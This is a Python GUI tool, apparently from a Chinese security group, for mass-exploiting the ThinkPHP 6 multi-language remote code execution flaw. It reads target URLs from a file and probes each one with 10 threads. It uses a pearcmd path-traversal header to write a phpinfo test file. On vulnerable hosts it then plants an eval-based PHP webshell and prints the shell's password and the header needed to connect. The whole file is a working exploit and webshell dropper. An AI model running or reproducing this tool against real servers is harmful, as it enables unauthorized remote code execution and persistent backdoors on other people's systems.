import  tkinter as tk
import tkinter.ttk
from tkinter import filedialog
from tkinter import PhotoImage
import requests
import urllib3
import threading,queue
import HackRequests
urllib3.disable_warnings()

poc1='/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php'
poc2='/index.php'
poc3="/index.php?+config-create+/<?=@eval($_POST['pass'])?>+/tmp/shell.php"

headers1={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'think-lang':'../../../../../../../../usr/local/lib/php/pearcmd',
    'Cookie': 'think_lang=zh-cn',
}

headers2={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'think-lang':'../../../../../../../../tmp/hello',
    'Cookie': 'think_lang=zh-cn',
}
headers3={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie':'think_lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fshell',
    'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'
}

def thinkphp6():
    root = tk.Tk()
    root.geometry("630x450+374+182")
    root.title("thinkphp6多语言RCE by 鹏组安全")
    root.update()
    button_fname=tk.Frame(root)
    button_fname.grid(padx=2, pady=20, row=0, column=0)
    progressbarOne = tkinter.ttk.Progressbar(button_fname)
    progressbarOne.grid(padx=2, pady=20, row=0, column=4)
    entry=tk.Entry(button_fname,font=("宋体",15),fg="black",width=30)
    entry.grid(padx=2, pady=20, row=0, column=1)
    tt = tk.Text(root,font=('宋体',15),fg='green',)
    tt.place(x=15, y=80, width=590, height=162)
    tt1 = tk.Text(root, font=('宋体', 15), fg='green', )
    tt1.place(x=15, y=250, width=590, height=162)
    def open_file():
        filename = filedialog.askopenfilename(title='选择批量扫描的文件', filetypes=[('txt', '*.txt')])
        entry.insert('insert', filename)
    button_import = tk.Button(button_fname,text="导入文件",font=("宋体",15),fg="blue", command=open_file)
    button_import.grid(padx=2, pady=20, row=0, column=0)
    def rce():
        while not q.empty():
            url = q.get()
            progressbarOne['value']+=1
            h = HackRequests.hackRequests()
            print(url)
            url1=url+poc1
            url2 = (url + poc2).encode("utf-8")
            try:
                h.http(url=url1, headers=headers1,timeout=4)
                res2 = requests.get(url2, headers=headers2, verify=False)
                if 'Version' in res2.text:
                    tt1.insert('end', url + '存在漏洞\n')
                    tt1.see("end")
                    tt1.configure(state=tk.NORMAL)
                    print(url+'存在漏洞')
                    tt1.insert('end','正在向目标写入shell\n')
                    tt1.see("end")
                    tt1.configure(state=tk.NORMAL)
                    url3=url+poc3
                    shell_res=h.http(url=url3, headers=headers3)
                    if shell_res.status_code==200:
                        tt1.insert('end','shell写入成功:'+url+poc2+'\n连接密码:pass,header:think-lang: ../../../../../../../../tmp/shell\n')
                        tt1.see("end")
                        tt1.configure(state=tk.NORMAL)
                    else:
                        tt1.insert('end','写入失败\n')
                        tt1.see("end")
                        tt1.configure(state=tk.NORMAL)
                else:
                    tt.insert('end',url+'不存在漏洞\n')
                    tt.see("end")
                    tt.configure(state=tk.NORMAL)
            except:
                tt.insert('end',url+'异常\n')
                tt.see("end")
                tt.configure(state=tk.NORMAL)

    def run():
        number=0
        a=entry.get()
        try:
            with open(a) as f1:
                urls=f1.readlines()
        except:
            urls=a.split(' ')
        for url in urls:
            url=url.replace('\n','')
            if url=='':
                pass
            else:
                if 'http' not in url:
                    url='http://'+url
                number+=1
                q.put(url)
        progressbarOne['maximum'] = number
        progressbarOne['value'] = 0
        for i in range(10):
            th = threading.Thread(target=rce)
            th.setDaemon(True)
            th.start()

    button = tk.Button(button_fname,text="开始检测",font=("宋体",15),fg="blue",command=run)
    button.grid(padx=2, pady=20, row=0, column=3)
    root.mainloop()

if __name__ == '__main__':
    q=queue.Queue()
    thinkphp6()

